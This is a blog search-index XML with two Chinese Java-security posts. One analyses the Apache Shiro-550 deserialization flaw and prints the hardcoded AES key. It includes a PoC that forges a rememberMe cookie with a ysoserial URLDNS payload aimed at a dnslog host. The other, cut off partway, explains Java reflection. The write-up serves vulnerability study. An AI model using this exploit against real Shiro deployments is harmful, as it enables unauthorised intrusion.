<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java反序列化漏洞分析(一)-Shiro550</title>
    <link href="/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/"/>
    <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。</p></blockquote><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。</p><p>在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p><p>Shiro的“记住我”功能是设置cookie中的rememberMe值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p><ol><li> 检索cookie中RememberMe的值</li><li> Base64解码</li><li> 使用AES解密</li><li> 反序列化</li></ol><p>漏洞原因在于第三步，在Apache Shiro&lt;=1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行。</p><blockquote><p>  只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p></blockquote><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先下载源码，并切换有漏洞的版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/apache/shiro.git  <br><span class="hljs-built_in">cd</span> shiro<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210506223552.png" alt="image-20210506223546214"></p><p>修改<code>samples/web/pom.xml</code>，支持jsp</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205022.png" alt="image-20210519210957110"></p><ol><li><p> Run</p></li><li><p> Edit Configurations</p></li><li><p> 添加TomcatServer(Local)</p></li><li><p> Server中配置Tomcat路径</p></li><li><p> Deployment中添加Artifact</p></li><li><p>选择sample-web:war exploded</p><p> <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205028.png" alt="image-20210519212838979"></p><blockquote><p>  这里若要使用burpsuite，注意端口不要和bp冲突</p></blockquote></li></ol><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205034.png" alt="image-20210519210846672"></p><p>然后运行即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205039.png" alt="image-20210519212950043"></p><h2 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h2><p>根据 <a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a> 描述</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205046.png" alt="image-20210519211422639"></p><p>这是几个重要的点:</p><ul><li>  检索<code>RememberMe</code> cookie的值</li><li>  Base64解码</li><li>  使用AES解密</li><li>  使用Java序列化（<code>ObjectInputStream</code>）反序列化。</li></ul><h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>先来瞧瞧这个cookie，进入登录界面，在登录时，勾选<code>Remember Me</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205052.png" alt="image-20210519213228149"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU<br></code></pre></td></tr></table></figure><p>使用<code>Base64</code>解码存储为二进制文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">import</span> struct<br><br>rememberMe = <span class="hljs-string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span><br><br>rememberMe_64 = base64.b64decode(rememberMe)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rememberMe&quot;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br><br>f.write(rememberMe_64)<br></code></pre></td></tr></table></figure><p>内容如下:<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205104.png" alt="image-20210519214639370"></p><p>上述内容中并没有在<a href="">初探Java反序列化漏洞（一）</a>中提到过的序列化的数据流以魔术数字和版本号<code>AC ED 00 05</code> 等字样。这是因为上述关键步骤中提到了<code>AES解密</code>，所以需要去跟一下源码。</p><h3 id="3-2-Shiro-500-中的-AES-解密"><a href="#3-2-Shiro-500-中的-AES-解密" class="headerlink" title="3.2 Shiro 500 中的 AES 解密"></a>3.2 Shiro 500 中的 AES 解密</h3><p>在IDEA中<code>ctrl+shift+f</code> 全局搜索<code>AES</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205115.png" alt="image-20210520201956272"></p><p>在<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中找到了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA==”)</strong> 就是我们要找的硬编码密钥，因为AES是对称加密，即加密密钥也同样是解密密钥。</p><p>然后看看shiro是怎么处理解密的，向下看，找到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Decrypts the byte array using the configured &#123;<span class="hljs-doctag">@link</span> #getCipherService() cipherService&#125;.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> encrypted the encrypted byte array to decrypt</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="hljs-doctag">@link</span> #getCipherService () cipher&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] decrypt(<span class="hljs-keyword">byte</span>[] encrypted) &#123;<br>    <span class="hljs-keyword">byte</span>[] serialized = encrypted;<br>    CipherService cipherService = getCipherService();<br>    <span class="hljs-keyword">if</span> (cipherService != <span class="hljs-keyword">null</span>) &#123;<br>        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());<br>        serialized = byteSource.getBytes();<br>    &#125;<br>    <span class="hljs-keyword">return</span> serialized;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数名<code>decrypt</code>，显而易见，是处理解密的，<code>cipherService</code>是一个接口,调用了其中的<code>decrypt</code>解密方法，需要两个变量<code>encrypted</code>(被加密的数组) 和 <code>getDecryptionCipherKey()</code>(获取解密秘钥)，前面说了AES是对称加密，即加密密钥也同样是解密密钥。而且从程序中也能看到，确实是同一个，通过在该类中查找<code>setDecryptionCipherKey()</code>方法，可以看到<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205124.png" alt="image-20210520204036228"></p><p>再搜索<code>setCipherKey</code>，可以看到构造方法中传入了<code>DEFAULT_CIPHER_KEY_BYTES</code>也就是<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>的值<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205131.png" alt="image-20210520204113812"></p><p>然后再看一下<code>CipherService</code>这个接口的<code>decrypt</code>的具体实现，<code>ctrl+右键</code>跟进去看看<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520205138.png" alt="image-20210520205000830"></p><p>这只是个接口，全局搜索<code>implements CipherService</code> 发现<code>src/main/java/org/apache/shiro/crypto/JcaCipherService.java</code>实现了<code>CipherService</code>接口，进去看看<code>decrypt</code>方法</p><p>为了方便，我们在这里下个断点，发现是<code>CBC</code>模式，并且 <code>iv</code>偏移量的值为 **byte[] iv = new byte[16] ** <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520215312.png" alt="image-20210520215309770"></p><p>利用下面的脚本解密之前<code>base64解码</code>后生成的<code>rememberMe</code>文件得到<code>decrypt.bin</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pip install pycrypto</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode_rememberme_file</span>(<span class="hljs-params">filename</span>):</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fpr:<br>        key  =  <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>        mode =  AES.MODE_CBC<br>        IV   = <span class="hljs-string">b&#x27; &#x27;</span> * <span class="hljs-number">16</span><br>        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)<br>        remember_bin = encryptor.decrypt(fpr.read())<br>    <span class="hljs-keyword">return</span> remember_bin<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;decrypt.bin&quot;</span>, <span class="hljs-string">&#x27;wb+&#x27;</span>) <span class="hljs-keyword">as</span> fpw:<br>        fpw.write(decode_rememberme_file(sys.argv[<span class="hljs-number">1</span>]))<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210520221430.png" alt="image-20210520221418998"></p><p>这是 Java 序列化的标志，说明解密成功</p><h3 id="3-3-反序列化"><a href="#3-3-反序列化" class="headerlink" title="3.3 反序列化"></a>3.3 反序列化</h3><p>看看解密之后的操作，回到<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>类中，看看，从哪里调用了<code>decrypt</code>函数，<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074327.png" alt="image-20210521073527745"></p><p>在<code>convertBytesToPrincipals</code>这里解密之后，执行了反序列化<code>deserialize</code>，进去瞅瞅<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074332.png" alt="image-20210521074103621"></p><p>通过获取<code>getSerializer()</code>来调用反序列化，再看看<code>SetSerializer</code><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074338.png" alt="image-20210521074230279"></p><p><strong>src/main/java/org/apache/shiro/io/DefaultSerializer.java</strong><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521074341.png" alt="image-20210521074304324"></p><p>这里使用的是默认反序列化类，没有任何检验，<code>readobject()</code>触发反序列化!<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092011.png" alt="image-20210521074629505"></p><h2 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h2><p>现在我们知道了<strong>shiro550</strong>在获取到<strong>rememberMe cookie</strong>的值后，通过硬编码的KEY **kPH+bIxk5D2deZiIxcaaaA==<strong>进行AES解密，解密完成之后直接调用默认的反序列化的</strong>readobject()**方法，没有经过任何的校验。</p><p>具体的 <strong>Payload</strong> 也就呼之欲出了，将<code>payload</code>通过AES加密伪造<strong>rememberMe cookie</strong>,我们通过刚才的解密流程知道<strong>shiro550</strong>采用的<strong>CBC</strong>模式、**byte[] iv = new byte[16]**， 通过脚本伪造，利用<code>ysoserial.jar</code> 神器生成<code>URLDNS</code>探测的payload进行探测(shiro550自带来commons-collections3.2.1，关于commons-collections的相关漏洞，后续分析)<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092006.png" alt="image-20210521091543563"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># －*-* coding:utf-8</span><br><span class="hljs-comment"># @Time    :  2020/10/16 17:36</span><br><span class="hljs-comment"># @Author  : nice0e3</span><br><span class="hljs-comment"># @FileName: poc.py</span><br><span class="hljs-comment"># @Software: PyCharm</span><br><span class="hljs-comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rememberme</span>(<span class="hljs-params">command</span>):</span><br>    popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>, <span class="hljs-string">&#x27;-jar&#x27;</span>, <span class="hljs-string">&#x27;ysoserial.jar&#x27;</span>, <span class="hljs-string">&#x27;URLDNS&#x27;</span>, command],<br>                             stdout=subprocess.PIPE)<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = <span class="hljs-string">b&#x27; &#x27;</span> * <span class="hljs-number">16</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    file_body = pad(popen.stdout.read())<br>    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))<br>    <span class="hljs-keyword">return</span> base64_ciphertext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 替换dnslog </span><br>    payload = rememberme(<span class="hljs-string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.cookie&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> fpw:<br><br>        print(<span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode()))<br>        res = <span class="hljs-string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(payload.decode())<br>        fpw.write(res)<br></code></pre></td></tr></table></figure><p>运行生成</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==<br></code></pre></td></tr></table></figure><p>替换打成功<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521091957.png" alt="image-20210521084722601"></p><p>其实一开始是失败的，shiro550自带的包是commons-collections3.2.1,原生情况下直接用ysoserial打，是不会成功的，其他位置中直接添加了<img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210521092002.png" alt="image-20210521091756305"></p><p>commons-collections4的包，才可以顺畅复现。至于为啥原生的3.2.1不能触发漏洞，以及可不可以触发漏洞，下篇文章再分析。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Apache Shiro Java 反序列化漏洞分析 <a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p><p>Java安全之Shiro 550反序列化漏洞分析 <a href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p><p>ysoserial <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探Java反序列化漏洞(二)</title>
    <link href="/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/"/>
    <url>/2021/05/02/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  不能食言，再晚也要写</p></blockquote><h2 id="0x01-Java反射"><a href="#0x01-Java反射" class="headerlink" title="0x01 Java反射"></a>0x01 Java反射</h2><p>反射之中包含了一个「反」字，有「反」就会有「正」，那么解释反射就必须先从「正」开始解释。</p><p>一般情况下，当使用某个类时必定知道它是什么类（类名），是用来做什么的（类的属性和方法）。于是我们直接对这个类进行实例化，之后使用这个类对象进行操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">User user = <span class="hljs-keyword">new</span> User();<br>user.setName(<span class="hljs-string">&quot;yhy&quot;</span>);<br>System.out.println(user.getName());<br></code></pre></td></tr></table></figure><p>“正射”就是通过new创建了一个<strong>User</strong>实例，然后通过实例(user)去调用其所属方法。</p><p>但是当你<strong>new</strong>的时候不知道类名怎么办？受<strong>private</strong>保护的方法怎么调用？这时候反射的作用就体现出来了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// new</span><br>Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br>Object object = clz.newInstance();<br><br><span class="hljs-comment">// setName(&quot;yhy&quot;)</span><br>Method method = clz.getMethod(<span class="hljs-string">&quot;setName&quot;</span>, String.class);<br>method.invoke(object, <span class="hljs-string">&quot;yhy&quot;</span>);<br><br><span class="hljs-comment">// getName()</span><br>Method name = clz.getDeclaredMethod(<span class="hljs-string">&quot;getName&quot;</span>,<span class="hljs-keyword">null</span>);<br>Object o1 = name.invoke(object, <span class="hljs-keyword">null</span>);<br>System.out.println(o1);<br></code></pre></td></tr></table></figure><p>上面两段代码的执行结果，是完全一样的。但是其思路完全不一样，第一段代码在未运行时就已经确定了要运行的类（User），而第二段代码则是在运行时通过字符串值才得知要运行的类（yhy.reflect.User）。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210502224435.png"></p><p>所以说什么是反射？</p><p><strong>反射就是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。</strong></p><p>java反射机制给漏洞利用提供了很多便利，我们可以在很多java漏洞的exp中看到它的影子，所以，学习java安全是绕不开它的。</p><blockquote><p>  Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，不需要提前在编译期知道运行的对象是谁。</p></blockquote><h2 id="0x02-反射常用API"><a href="#0x02-反射常用API" class="headerlink" title="0x02 反射常用API"></a>0x02 反射常用API</h2><h3 id="2-1-获取Class对象"><a href="#2-1-获取Class对象" class="headerlink" title="2.1 获取Class对象"></a>2.1 获取Class对象</h3><p>在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。</p><p>在 Java API 中，获取 Class 类对象有三种方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1.通过字符串获取Class对象，这个字符串必须带上完整路径名</span><br>Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br><span class="hljs-comment">// 2.通过类的class属性</span><br>Class clz = User.class;<br><span class="hljs-comment">// 3.通过对象的getClass()函数</span><br>User user = <span class="hljs-keyword">new</span> User();<br>Class clz = user.getClass();<br></code></pre></td></tr></table></figure><ul><li>  第一种方法是通过类的全路径字符串获取 Class 对象，这也是平时最常用的反射获取 Class 对象的方法；</li><li>  第二种方法有限制条件：需要导入类的包；</li><li>  第三种方法已经有了 User 对象，不再需要反射。</li></ul><h3 id="2-2-通过反射创建类对象"><a href="#2-2-通过反射创建类对象" class="headerlink" title="2.2 通过反射创建类对象"></a>2.2 通过反射创建类对象</h3><p>通过反射创建类对象主要有两种方式：</p><p><strong>第一种：通过 Class 对象的 newInstance() 方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br>Object object = clz.newInstance();<br></code></pre></td></tr></table></figure><p><strong>第二种：通过 Constructor 对象的 newInstance() 方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br>Constructor constructor = clz.getConstructor();<br>Object object = constructor.newInstance();<br></code></pre></td></tr></table></figure><p>通过 <strong>Constructor</strong> 对象创建类对象可以选择特定构造方法，而通过 <strong>Class</strong> 对象则只能使用默认的无参数构造方法。下面的代码就调用了一个有参数的构造方法进行了类对象的初始化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br>Constructor constructor = clz.getConstructor(String.class);<br>Object object = constructor.newInstance(<span class="hljs-string">&quot;yhy&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="2-3-通过反射获取类属性、方法、构造器"><a href="#2-3-通过反射获取类属性、方法、构造器" class="headerlink" title="2.3 通过反射获取类属性、方法、构造器"></a>2.3 通过反射获取类属性、方法、构造器</h3><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210502224545.png"></p><p>两个属性：一个<strong>公有(age)<strong>，一个</strong>私有(Name)</strong></p><p>我们通过 <strong>Class</strong> 对象的 <strong>getFields()</strong> 方法可以获取 Class 类的属性，但无法获取私有属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br>Field[] fields = clz.getFields();<br><span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>    System.out.println(field.getName());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210502224502.png"></p><p>而如果使用 <strong>Class</strong> 对象的 **getDeclaredFields() **方法则可以获取包括私有属性在内的所有属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clz = Class.forName(<span class="hljs-string">&quot;yhy.reflect.User&quot;</span>);<br>Field[] fields = clz.getDeclaredFields();<br><span class="hljs-keyword">for</span> (Field field : fields) &#123;<br>    System.out.println(field.getName());<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210502224558.png"></p><p>与获取类属性一样，当我们去获取类方法、类构造器时，如果要获取私有方法或私有构造器，则必须使用有 declared 关键字的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 